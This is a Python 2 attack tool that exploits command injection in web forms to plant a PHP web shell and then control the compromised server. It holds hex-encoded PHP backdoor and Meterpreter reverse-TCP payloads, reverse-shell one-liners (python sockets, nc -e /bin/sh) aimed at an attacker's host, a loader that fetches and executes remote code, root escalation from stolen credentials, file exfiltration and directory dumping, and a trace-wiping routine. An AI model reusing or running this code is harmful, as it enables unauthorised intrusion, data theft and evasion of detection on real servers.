#!/usr/bin/env python

### TODO :: Add proxy support
### TODO :: Add windows supprt and envornment recognition (maybe a translator for linux-to-windows commands)
### TODO :: Add encryption/decryption of payloads

import os, sys, getopt, urllib, urllib2, re, socket, threading, time, binascii, hashlib, math, random, string, json, base64

_gs = {
	"_stager": "cmd",
	"_var_exec": "SMPLSHLL_EXEC",
	"_var_eval": "SMPLSHLL_EVAL",
	
	"url": "",
	"post": None,
	"get": None,
	"cookies": None,
	
	"chunk_size": 64,					## The heigher, the better upload/download speed, but too heigh can make the requests to big.
	"initial_path": "",
	"shell_path": "",
	"working_directory": "",
}

_payloads = {

	"stager": [
		"_.php",
		"3c3f7068702069662028697373657428245f4745545b22636d64225d2929207b206563686f207368656c6c5f6578656328245f4745545b22636d64225d293b206469653b207d203f3e"
	],
	
	"smplshll": [
		"_.php",
		"3c3f7068702066756e6374696f6e2068657832737472282468657829207b20666f722824693d303b24693c7374726c656e2824686578293b24692b3d3229207b2024737472202e3d20636872286865786465632873756273747228246865782c24692c322929293b207d2072657475726e20247374723b207d2069662028697373657428245f5345525645525b22485454505f534d504c53484c4c5f4556414c225d2929207b206576616c286865783273747228245f5345525645525b22485454505f534d504c53484c4c5f4556414c225d29293b206469653b207d2069662028697373657428245f5345525645525b22485454505f534d504c53484c4c5f45584543225d2929207b206563686f207368656c6c5f65786563286865783273747228245f5345525645525b22485454505f534d504c53484c4c5f45584543225d29293b206469653b207d3f3e"
	],
	
	"php_meterpreter_reverse_tcp": [
		"_.php",
		"3c3f706870206572726f725f7265706f7274696e672830293b20246970203d2022{0}223b2024706f7274203d20{1}3b2069662028282466203d202273747265616d5f736f636b65745f636c69656e7422292026262069735f63616c6c61626c652824662929207b202473203d20246628227463703a2f2f7b2469707d3a7b24706f72747d22293b2024735f74797065203d202273747265616d223b207d20656c736569662028282466203d202266736f636b6f70656e22292026262069735f63616c6c61626c652824662929207b202473203d202466282469702c2024706f7274293b2024735f74797065203d202273747265616d223b207d20656c736569662028282466203d2022736f636b65745f63726561746522292026262069735f63616c6c61626c652824662929207b202473203d2024662841465f494e45542c20534f434b5f53545245414d2c20534f4c5f544350293b2024726573203d2040736f636b65745f636f6e6e6563742824732c202469702c2024706f7274293b2069662028212472657329207b2064696528293b207d2024735f74797065203d2022736f636b6574223b207d20656c7365207b2064696528226e6f20736f636b65742066756e637322293b207d206966202821247329207b2064696528226e6f20736f636b657422293b207d20737769746368202824735f7479706529207b2063617365202273747265616d223a20246c656e203d2066726561642824732c2034293b20627265616b3b20636173652022736f636b6574223a20246c656e203d20736f636b65745f726561642824732c2034293b20627265616b3b207d206966202821246c656e29207b2064696528293b207d202461203d20756e7061636b28224e6c656e222c20246c656e293b20246c656e203d2024615b226c656e225d3b202462203d2022223b207768696c6520287374726c656e28246229203c20246c656e29207b20737769746368202824735f7479706529207b2063617365202273747265616d223a202462202e3d2066726561642824732c20246c656e2d7374726c656e28246229293b20627265616b3b20636173652022736f636b6574223a202462202e3d20736f636b65745f726561642824732c20246c656e2d7374726c656e28246229293b20627265616b3b207d207d2024474c4f42414c535b226d7367736f636b225d203d2024733b2024474c4f42414c535b226d7367736f636b5f74797065225d203d2024735f747970653b206576616c282462293b2064696528293b3f3e",
	],
}

help_notes = """
  Simple Shell (Controller) 0.1
  -----------------------------
  Created by: z0noxz
  https://github.com/z0noxz/smplshllctrlr

  Usage: (python) simple-shell-controller.py [options]

  Options:
    --help                Show this help message and exit
    --url                 Shell interface URL without paramters (e.g. "http://www.site.com/simple-shell.php")
    
    --post                Declare POST data (eg. "{'submit':'','ip':_INJECT_}")
    --get                 Declare GET data (eg. "?ip=_INJECT_")
    --cookies             Declare COOKIE data (eg. "PHPSESSID=deadbeefdeadbeefdeadbeefdeadbeef")

    Shell commands:
      Commands that are executable while in shell interface
      
      meterpreter         Injects a PHP Meterpreter, PHP Reverse TCP Stager (requires a listener for php/meterpreter/reverse_tcp)
      upload              Upload a file
      download            Download a file
      kill_self           Cleans up traces and aborts the shell
      exit                Exits the shell
"""
def _exploit():
	global _gs, _payloads
	
	_gs["url_stager"] = None
	_placeholder = "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for x in range(32))
		
	def technique_basic_post():
		sys.stdout.write("  Testing basic injection.......................................")
		sys.stdout.flush()
		
		for special in ["&", ";", "|", "|", "localhost &&", "localhost &;&"]:
			
			validator = special + " echo " + _placeholder
			
			if not _gs["post"] == None:
				request = urllib2.Request(_gs["url"] + (_gs["get"] if not _gs["get"] == None else ""), urllib.urlencode(json.loads(_gs["post"].replace("'", "\"").replace("_INJECT_", "\"" + validator + "\""))))
			else:
				request = urllib2.Request(_gs["url"] + (_gs["get"] if not _gs["get"] == None else ""))
				
			if not _gs["cookies"] == None:
				request.add_header("cookie", _gs["cookies"])
				
			response = urllib2.urlopen(request).read()

			if _placeholder in response:
				print("[\033[92mOK\033[0m]")				
				sys.stdout.write("\n  Uploading stager..............................................")
				sys.stdout.flush()
				
				chunk = "\\x" + "\\x".join([_payloads["stager"][1][i:i + 2] for i in range(0, len(_payloads["stager"][1]), 2)])
				injection = special + " echo -n -e '" + chunk.replace("\\", "\\\\") + "' >> " + _payloads["stager"][0]
				
				if not _gs["post"] == None:
					request = urllib2.Request(_gs["url"] + (_gs["get"] if not _gs["get"] == None else ""), urllib.urlencode(json.loads(_gs["post"].replace("'", "\"").replace("_INJECT_", "\"" + injection + "\""))))
				else:
					request = urllib2.Request(_gs["url"] + (_gs["get"] if not _gs["get"] == None else ""))

				if not _gs["cookies"] == None:
					request.add_header("cookie", _gs["cookies"])	

				urllib2.urlopen(request)
				_gs["url_stager"] = _gs["url"][:_gs["url"].rfind("/") + 1] + _payloads["stager"][0]
				
				print("[\033[92mOK\033[0m]")
				return True
			
		print(".[\033[91mX\033[0m]")
		return False
	
	## Queue techniques
	techniques = [
		technique_basic_post,
	]
	
	print("")
	print("  Test injection techniques")
	print("")
	
	for technique in techniques:
		if technique() and not _gs["url_stager"] == None:
			stager_upload(_gs["url_stager"], _payloads["smplshll"][1], _payloads["smplshll"][0])
			_gs["url_exec"] = _gs["url"][:_gs["url"].rfind("/") + 1] + _payloads["smplshll"][0]
			_gs["url"] = _gs["url_exec"]
			
			sys.stdout.write("  Removing stager...............................................")
			sys.stdout.flush()
			execute_command("rm " + _payloads["stager"][0], False)
			print("[\033[92mOK\033[0m]")
			return
	
	print "\n  \033[91mSystem could not be exploited\033[0m"
	sys.exit(2)

def _init():
	global _gs, _payloads
	
	import subprocess as sp
	sp.call("clear",shell=True)
		
	for key in _payloads.keys():
		_payloads[key][0] = "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for x in range(32)) + ".php"
		
	_exploit()
	
def _exit():
	
	confirm = raw_input("  Run 'Kill Self Protocol' (Y/n)? ")
	
	if (not confirm == "n" or not confirm == "no"):
		kill_self()
	sys.exit

def _command(url, header, cmd, verbose):
	global _gs
	
	request = urllib2.Request(url)
	request.add_header(header, binascii.hexlify(cmd))
	
	output = urllib2.urlopen(request).read()
	if (verbose): print output
	return output

def execute_command(cmd, verbose = True):
	global _gs
	return _command(_gs["url_exec"], _gs["_var_exec"], cmd, verbose)

def eval_command(cmd, verbose = True):
	global _gs
	return _command(_gs["url_exec"], _gs["_var_eval"], cmd, verbose)
		
def split(str, num):
    return [ str[start:start+num] for start in range(0, len(str), num) ]

def check_working_directory(working_directory, new_directory):
	
	new_directory = new_directory if not new_directory == "" else working_directory
	
	if (re.match("^(/[^/ ]*)+/?$", new_directory)):
		if (execute_command("if test -d " + new_directory + "; then \"1\"; fi", False) == ""):
			return new_directory
	
	return working_directory

def php_variables():
	eval_command("print_r(get_defined_vars());")
	
def php_eval():
	global _gs
		
	print("")
	print("  PHP Evaluator:")
	print("  ------------------------------------------------------------------")
	print("  This program evaluats PHP code")
	print("")
		
	eval_command(raw_input("  PHP Code: "))
	
def inject_shell():
	global _gs, _payloads
	
	print ""
	lhost = raw_input("  LHOST: ")	
	print ""
	
	def send(connection, _input):
		
		connection.send(_input + "\r")
		time.sleep(0.5)
		result = connection.recv(16834).split("\n")
		
		return "\n".join(result[1:-1]).strip()
	
	def socketBind(lhost = "", lport = 0, retries = 5):

		try:
			_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			_socket.bind((lhost, lport))
			_socket.listen(1)
			print "  \033[92m[+]\033[0m Socket listening on port {0}".format(_socket.getsockname()[1])
			return _socket

		except socket.error as err:
			print "  \033[91m[-]\033[0m Socket binding error: " + str(err[0])

			if retries > 0:
				print "  \033[94m[*]\033[0m Retrying {0}...".format(retries)
				return socketBind(lhost, lport, retries - 1)

			return None

	def sendPayload(lhost, lport):
		payloads = [
			"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
			"nc -e /bin/sh {0} {1}",
			"/bin/nc.traditional -e /bin/sh {0} {1}",
		]
		
		time.sleep(1)
		for payload in payloads:
			pid = execute_command(payload.format(lhost, lport) + " & echo $!", False).strip()
			if execute_command("ps --pid " + pid + " -o comm=", False) <> "":
				break

	def socketAccept(_socket):

		if _socket == None: return

		def spawnTerminal(connection):
			spawners = [
				"python -c 'import pty; pty.spawn(\"/bin/sh\")'",
				"/bin/sh -i",
				"perl -e 'exec \"/bin/sh\";'",
				##"perl: exec \"/bin/sh\";",
				##"ruby: exec \"/bin/sh\"",
				##"lua: os.execute('/bin/sh')"
			]

			print "  \033[94m[*]\033[0m Trying to spawn tty"
			for spawner in spawners:
				
				## Try to spawn tty
				send(connection, spawner)
				
				## Check for success
				if (send(connection, "echo $?") == "0"):
					print "  \033[92m[+]\033[0m Successfully spawned tty"				
					return True

			print "  \033[91m[-]\033[0m Failed to spawn any tty"
			return False

		def sessionInteract(connection, address, is_tty):

			def command_cred_root(connection, address, is_tty, match):
				if match:
					if not is_tty:
						print "  \033[91m[-]\033[0m This command needs tty"
					else:			
						print "  \033[94m[*]\033[0m Trying to spawn " + match.group(1)
						
						result = None
						
						send(connection, "su " + match.group(1))
						send(connection, match.group(2))
						
						if send(connection, "whoami") == match.group(1):
							print "  \033[92m[+]\033[0m Successfully spawned " + match.group(1)
							print "  \033[94m[*]\033[0m Trying to spawn root"
							send(connection, "sudo -i")
							send(connection, match.group(2))
							send(connection, "")
						else:
							print "  \033[91m[-]\033[0m Failed to spawn " + match.group(1)

						if send(connection, "whoami") == "root":
							print "  \033[92m[+]\033[0m Successfully spawned root"
						else:
							print "  \033[91m[-]\033[0m Failed to spawn root"
				else:
					print "  usage: cred_root <username> <password>"
					
			def command_meterpreter(connection, address, is_tty, match):
				if match:
					print "  \033[94m[*]\033[0m Trying to spawn meterpreter shell"
					payload = base64.b64encode("""import socket,struct
s=socket.socket(2,socket.SOCK_STREAM)
s.connect(('""" + match.group(1) + """',""" + match.group(2) + """))
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
	d+=s.recv(l-len(d))
exec(d,{'s':s})
""")
					try:
						pid = send(connection, "python -c 'import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,\"UTF-8\")}[sys.version_info[0]](\"" + payload + "\")));' & echo $!")
						pid = int(str(pid.split("\n")[1]).strip()) + 1
						
						if send(connection, "ps --pid " + str(pid) + " -o comm=").split("\n")[0].strip() == "python":
							print "  \033[92m[+]\033[0m Successfully spawned meterpreter shell"
						else:
							print "  \033[91m[-]\033[0m Failed to spawn meterpreter shell"	
					except:
						print "  \033[92m[+]\033[0m Could not determine status of execution"				
				else:
					print "  usage: meterpreter <lhost> <lport>"
					
			commands = {
				"cred_root": {
					"description": "Tries to spawn a root shell from credentials",
					"validation": "cred_root\s+([^\s]+)\s+([^\s]+)",
					"run" : command_cred_root
				},
				"meterpreter": {
					"description": "Injects a python/meterpreter/reverse_tcp payload",
					"validation": "meterpreter\s+([^\s]+)\s+([^\s]+)",
					"run": command_meterpreter,
				}
			}

			print ""
			while True:
				_input = raw_input("\033[4mShell\033[0m" + (" (\033[91mtty\033[0m)" if is_tty else "") + " > ")
				_input_command = _input.split(" ")[0]

				if _input_command == "exit":
					connection.close()
					break

				if _input_command == "?":
					max_key = max(map(len, commands))
					max_des = max([len(commands[x]["description"]) for x in commands.keys()])

					print "  " + (" " * (max_key + max_des - 7)) + "COMMANDS"
					print "  " + ("=" * (max_key + max_des + 1))
					print "  " + "command" + (" " * (max_key - 6)) + "description"
					print "  " + ("-" * max_key) + " " + ("-" * max_des)

					for command in commands.keys():
						print "  " + command + (" " * (max_key - len(command) + 1)) + commands[command]["description"]
					print "  exit" + (" " * (max_key - 3))  + "Abort shell"
					print ""
					continue

				## Check if command
				if _input_command in commands.keys():
					commands[_input_command]["run"](connection, address, is_tty, re.compile(commands[_input_command]["validation"]).match(_input))
				else:
					print send(connection, _input)
				print ""

		try:
			connection, address = _socket.accept()
			time.sleep(0.2)			# Wait
			connection.recv(16834)	# Clear buffer
			print "  \033[92m[+]\033[0m Session opened from {0}:{1}".format(address[0], address[1])
			sessionInteract(connection, address, spawnTerminal(connection))

		except socket.error as err:
			print "  \033[91m[-]\033[0m Socket accepting error: " + str(err[0])
		finally:
			_socket.close()

	## Execute shell
	_socket = socketBind()
	threading.Thread(target=sendPayload, args=(lhost, _socket.getsockname()[1])).start()
	socketAccept(_socket)
	
	'''
	shells = {
		"netcat": "nc -e /bin/sh {0} {1}",
		"netcat-traditional": "/bin/nc.traditional -e /bin/sh {0} {1}",
		"python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
	}
	
	
	
	
	lhost = raw_input("  LHOST: ")
	lport = raw_input("  LPORT: ")
	shell = None
	
	while (not shell in shells.keys()):
		shell = raw_input("  SHELL(" + ", ".join(sorted(shells.keys())) + "): ")
	
	sys.stdout.write("\n  Initializing..................................................")
	sys.stdout.flush()
	print("[\033[92mOK\033[0m]")
	#re.sub("<[^>]*>", "", urllib2.urlopen(_gs["url"][:_gs["url"].rfind("/")] + "/" + payload[0], "", 1).read()).strip()#
	sys.stdout.write("  Executing shell...............................................")
	sys.stdout.flush()
	pid = execute_command(shells[shell].format(lhost, lport) + " & echo $!", False).strip()
	print("[\033[92mOK\033[0m]" if not execute_command("ps --pid " + pid + " -o comm=", False) == "" else ".[\033[91mX\033[0m]")
	'''
	'''
	TODO ::
	invoke the process with its stdin coming from something that IS a pipe (or socket etc) so that you can write stuff into it.
	A named pipe MAY work here (see mknod(1) or mkfifo(3) ).
	Otherwise, you'll need a control program which sits in front of it and uses a pair of pipes to talk to it.
	
	Try to automate the Tips section to get a root terminal
	
	using pid
	'''
	
	
	
	## inject this : python -c 'import pty; pty.spawn("/bin/sh")'
def inject_meterpreter_shell():
	global _gs, _payloads
	
	print("")
	print("  PHP Meterpreter Injection:")
	print("  ------------------------------------------------------------------")
	print("  This program injects a PHP Meterpreter Reverse TCP Stager to the")
	print("  target server. \033[93mRemember to initialize a reverse TCP handler before")
	print("  executing this program.\033[0m The listener payload should be:")
	print("")
	print("  \033[94mphp/meterpreter/reverse_tcp\033[0m")
	print("")
		
	lhost = "".join("{:02x}".format(ord(c)) for c in raw_input("  LHOST: "))
	lport = "".join("{:02x}".format(ord(c)) for c in raw_input("  LPORT: "))
	
	sys.stdout.write("\n  Initializing..................................................")
	sys.stdout.flush()
	print("[\033[92mOK\033[0m]")
	
	## Define payload
	payload = _payloads["php_meterpreter_reverse_tcp"]
	sys.stdout.write("  Preparing payload " + payload[0] + " " + ("." * (43 - len(payload[0]))))
	sys.stdout.flush()
	print("[\033[92mOK\033[0m]")
	
	## Remove payload if it allready exists
	sys.stdout.write("  Removing previous payload, if one exists......................")
	sys.stdout.flush()
	execute_command("rm " + payload[0], False)
	print("[\033[92mOK\033[0m]")

	## Allocate filename
	sys.stdout.write("  Allocating filename...........................................")
	sys.stdout.flush()
	execute_command("touch " + payload[0], False)
	print("[\033[92mOK\033[0m]")

	## Upload meterpreter payload
	stream_upload(payload[1].format(lhost, lport), payload[0])

	## Execute meterpreter shell
	sys.stdout.write("  Executing shell...............................................")
	sys.stdout.flush()
	
	try:
		err = re.sub("<[^>]*>", "", urllib2.urlopen(_gs["url"][:_gs["url"].rfind("/")] + "/" + payload[0], "", 1).read()).strip()
		if not err == "": print(".[\033[91mX\033[0m]\n\n  \033[91mError: " + err + "\033[0m")
			
	## If the urlopen times out, it means (or could mean) that the payload is executed
	except urllib2.URLError, e:
		if isinstance(e.reason, socket.timeout):
			print("[\033[92mOK\033[0m]")
	except socket.timeout, e:
		print("[\033[92mOK\033[0m]")

def stager_upload(url, stream, path):
	global _gs
	
	counter = 1
	step = 1
	chunk_size = _gs["chunk_size"]
	progress_width = 64 - 8 - 4
	file_size = len(stream) / 2
	chunk_count = math.ceil(file_size / chunk_size)

	## Setup progress bar
	sys.stdout.write("  Sending stage")	
	sys.stdout.flush()
	
	try:
		while True:
			chunk = stream[(chunk_size * 2 * (counter - 1)):][:chunk_size * 2]

			if chunk:
				chunk = "\\x" + "\\x".join([chunk[i:i + 2] for i in range(0, len(chunk), 2)])
				cmd = "echo -n -e '" + chunk + "' >> " + path
				
				urllib2.urlopen(url + ("?" +_gs["_stager"] + "=" + urllib.quote_plus(cmd) if not cmd == None else "")).read()
			
				if (((chunk_count / progress_width) > 0) and (counter / (chunk_count / progress_width)) > step):
					sys.stdout.write(".")
					sys.stdout.flush()
					step += 1
				counter += 1
			else:
				break

		sys.stdout.write("\b" * (step - 1))
		sys.stdout.flush()
		sys.stdout.write(("." * (progress_width - 3)))
		print("[\033[92mOK\033[0m]")
		
	except:
		print(".[\033[91mX\033[0m]")

def stream_upload(stream, path, verbose = True):	
	counter = 1
	step = 1
	chunk_size = _gs["chunk_size"]
	progress_width = 64 - 8
	file_size = len(stream) / 2
	chunk_count = math.ceil(file_size / chunk_size)

	## Setup progress bar
	if verbose:
		sys.stdout.write("  Uploading")
		sys.stdout.flush()
	
	try:
		while True:
			chunk = stream[(chunk_size * 2 * (counter - 1)):][:chunk_size * 2]

			if chunk:
				chunk = "\\x" + "\\x".join([chunk[i:i + 2] for i in range(0, len(chunk), 2)])
				execute_command("echo -n -e '" + chunk + "' >> " + path, False)
				
				if (((chunk_count / progress_width) > 0) and (counter / (chunk_count / progress_width)) > step):
					if verbose:
						sys.stdout.write(".")
						sys.stdout.flush()
					step += 1
				counter += 1
			else:
				break

		if verbose:
			sys.stdout.write("\b" * (step - 1))
			sys.stdout.flush()
			sys.stdout.write(("." * (progress_width - 3)))
			print("[\033[92mOK\033[0m]")
	except:
		if verbose:
			print(".[\033[91mX\033[0m]")
		
		
def file_upload():
	global _gs
		
	print("")
	print("  File Uploader:")
	print("  ------------------------------------------------------------------")
	print("  This program simply uploads a file to the target server")
	print("")
	
	lpath = raw_input("  Local path: ")
	file_name = lpath[lpath.rfind("/") + 1:]
	
	sys.stdout.write("\n  Initializing..................................................")
	sys.stdout.flush()
	print("[\033[92mOK\033[0m]")
	
	try:
		with open(lpath, "rb") as f:

			counter = 1
			step = 1
			chunk_size = _gs["chunk_size"]
			progress_width = 64 - 8
			file_size = os.path.getsize(lpath)
			chunk_count = math.ceil(file_size / chunk_size)
			local_hash_md5 = hashlib.md5()

			## Setup progress bar
			sys.stdout.write("  Uploading")
			sys.stdout.flush()

			execute_command("cd " + _gs["working_directory"] + " && rm " + file_name, False)
			execute_command("cd " + _gs["working_directory"] + " && touch " + file_name, False)

			while True:
				chunk = f.read(chunk_size)
				local_hash_md5.update(chunk)

				if chunk:				
					chunk = binascii.hexlify(chunk)
					chunk = "\\x" + "\\x".join([chunk[i:i + 2] for i in range(0, len(chunk), 2)])

					execute_command("cd " + _gs["working_directory"] + " && echo -n -e '" + chunk + "' >> " + file_name, False)

					if ((counter / (chunk_count / progress_width)) > step):
						sys.stdout.write(".")
						sys.stdout.flush()
						step += 1
					counter += 1
				else:
					break

			sys.stdout.write("\b" * (step - 1))
			sys.stdout.flush()
			sys.stdout.write(("." * (progress_width - 3)))
			print("[\033[92mOK\033[0m]")
			
			sys.stdout.write("  Analysing file integrity......................................")
			sys.stdout.flush()
			print("[\033[92mOK\033[0m]" if (str(execute_command("cd " + _gs["working_directory"] + " && md5sum " + file_name + " | awk '{ print $1 }'", False)).strip() == str(local_hash_md5.hexdigest()).strip()) else ".[\033[91mX\033[0m]")
	except:
		print("\n  \033[91mError: cannot open '" + file_name + "'\033[0m")

def file_download(path = None):
	global _gs

	if (path == None):
		print("")
		print("  File Downloader:")
		print("  ------------------------------------------------------------------")
		print("  This program simply downloads a file from the target server")
		print("\n")		
	
	rpath = (path if not path == None else raw_input("  Remote path: "))
	file_name = rpath[rpath.rfind("/") + 1:]	
	
	sys.stdout.write("  Initializing..................................................")
	sys.stdout.flush()
	print("[\033[92mOK\033[0m]")
		
	try:
		counter = 1
		step = 1
		chunk_size = _gs["chunk_size"]
		progress_width = 64 - 10
		file_size = int(execute_command("cd " + _gs["working_directory"] + " && stat -c%s " + rpath, False))
		chunk_count = math.ceil(file_size / chunk_size)
		local_hash_md5 = hashlib.md5()

		## Setup progress bar
		sys.stdout.write("  Downloading")
		sys.stdout.flush()
		
		try: os.remove(file_name)
		except OSError: pass
		
		while True:
			chunk = execute_command("cd " + _gs["working_directory"] + " && hexdump -ve '1/1 \"%.2x\"' " + rpath + " -n " + str(chunk_size) + " -s " + str(chunk_size * (counter - 1)), False)		

			if (not chunk == ""): 
				with open(file_name, "ab") as f:
					f.write(binascii.unhexlify(chunk))
				
				if ((counter / (chunk_count / progress_width)) > step):
					sys.stdout.write(".")
					sys.stdout.flush()
					step += 1
				counter += 1
			else:
				break

		sys.stdout.write("\b" * (step - 1))
		sys.stdout.flush()
		sys.stdout.write(("." * (progress_width - 3)))
		print("[\033[92mOK\033[0m]")
		
		sys.stdout.write("  Analysing file integrity......................................")
		sys.stdout.flush()	

		local_hash_md5 = hashlib.md5()
		with open(file_name, "rb") as f:
			local_hash_md5.update(f.read())
		
		print("[\033[92mOK\033[0m]" if (str(execute_command("cd " + _gs["working_directory"] + " && md5sum " + rpath + " | awk '{ print $1 }'", False)).strip() == str(local_hash_md5.hexdigest()).strip()) else ".[\033[91mX\033[0m]")
	
	except:
		print("\n  \033[91mError: cannot download file'" + file_name + "'\033[0m")

def dir_dump():
	global _gs
	
	for _file in execute_command("ls " + _gs["working_directory"], None).strip().split("\n"):
		print("\n  \033[94mDownload file: '" + _file + "'\033[0m")
		print("  ------------------------------------------------------------------")
		file_download(_gs["working_directory"] + "/" + _file)
		
def kill_self():
	global _gs, _payloads
	
	print("")
	print("  Kill Self Protocol:")
	print("  ------------------------------------------------------------------")
	print("  This program cleans up traces and aborts the shell")
	print("")
	
	## Remove payloads
	sys.stdout.write("  Removing payloads.............................................")
	for _payload in _payloads.keys():
		if not _payload == "smplshll":
			execute_command("rm " + _gs["initial_path"] + "/" + _payloads[_payload][0], False)
	print("[\033[92mOK\033[0m]")
	
	## Remove self
	sys.stdout.write("  Removing initial shell........................................")
	execute_command("rm " + _gs["initial_path"] + "/" + _payloads["smplshll"][0], False)
	print("[\033[92mOK\033[0m]")
	
	## Shutting down
	print("  Shutting down...")
	sys.exit()
	
def main(argv):
	global _gs, help_notes
	
	try:
		opts, args = getopt.getopt(argv, "",
		[
			"help",
			"url=",
			"post=",
			"get=",
			"cookies=",
		])
	except getopt.GetoptError, err:
		print help_notes
		print err
		sys.exit(2)
	for opt, arg in opts:
		if opt in ("--help"):
			print help_notes
			sys.exit()
		elif opt in ("--url"): _gs["url"] = arg
		elif opt in ("--post"): _gs["post"] = arg
		elif opt in ("--get"): _gs["get"] = arg
		elif opt in ("--cookies"): _gs["cookies"] = arg

	if (not _gs["url"] == ""):
		
		try:
			urllib2.urlopen(_gs["url"]).read()
		except urllib2.URLError, e:
			print "\n  \033[91mCannot access the interface\033[0m"
			sys.exit(2)

		## Initialize backdoor
		_init()
		
		## Set initial global settings
		_gs["working_directory"] = execute_command("pwd", False).strip()
		_gs["initial_path"] = _gs["working_directory"]
		_gs["shell_path"] = _gs["initial_path"] + _gs["url"][_gs["url"].rfind("/"):]
		
		def _command(x = None):			
			cmds = {
				"php_var": [
					php_variables,
					"Prints the php variables"
				],
				"php_eval": [
					php_eval,
					"Evaluats php code"
				],
				"shell": [
					inject_shell,
					"test_shell"
				],
				"meterpreter": [
					inject_meterpreter_shell,
					"Injects a meterpreter shell"
				],
				"upload": [
					file_upload,
					"Uploads a file"
				],
				"download": [
					file_download,
					"Downloads a file"
				],
				"dir_dump": [
					dir_dump,
					"Downloads the current directory content"
				],
				"kill_self": [
					kill_self,
					"Cleans up traces and aborts the shell"
				],
				"exit": [
					_exit,
					"Exits the shell"
				],
				"?": [
					_command,
					"Shows command help"
				]
			}
			
			if (not x == None):
				fnc = cmds.get(x, None)
				if (not fnc == None): 
					fnc[0]()
					return True
				else:
					return False
			else:
				print ""
				print "                            Core Commands                           "
				print "  =================================================================="
				print "  Command             Description"
				print "  ------------------- ----------------------------------------------"
				for cmd in sorted(cmds.keys()):
					print "  " + cmd + (" " * (20 - len(cmd))) + cmds[cmd][1]
				return True
		
		print r"   ____  ____   ___ "
		print r"  / ___)/ ___) / __)"
		print r"  \___ \\___ \( (__ "
		print r"  (____/(____/ \___) Simple Shell (Controller) 0.1"		
		print ""
		print "  Shell    : " + _gs["shell_path"]
		print "  Id       : " + execute_command("id", False).strip()
		print "  Sudo     : " + ("\033[92mAccess granted\033[0m" if execute_command("timeout 2 sudo id && echo 1 || echo 0", False) == "1" else "\033[91mAccess denied\033[0m")
		print "  Help     : ?"
		print ""
		
		while (True):
			#user_input = raw_input("ssc [\033[94m" + _gs["working_directory"] + "\033[0m] > ").strip()
			user_input = raw_input("\033[4mssc\033[0m > ").strip()
						
			if (not _command(user_input)):
				output = execute_command("cd " + _gs["working_directory"] + " && " + user_input + " && printf \"\n\" && pwd", False).strip().split("\n")
				_gs["working_directory"] = check_working_directory(_gs["working_directory"], output[len(output) - 1])
				print "  " + "\n  ".join((output[:(len(output) - 1) - output[::-1].index("")] if '' in output else output[:len(output) - 1]))
			else:
				print ""
			
if __name__ == "__main__": main(sys.argv[1:])
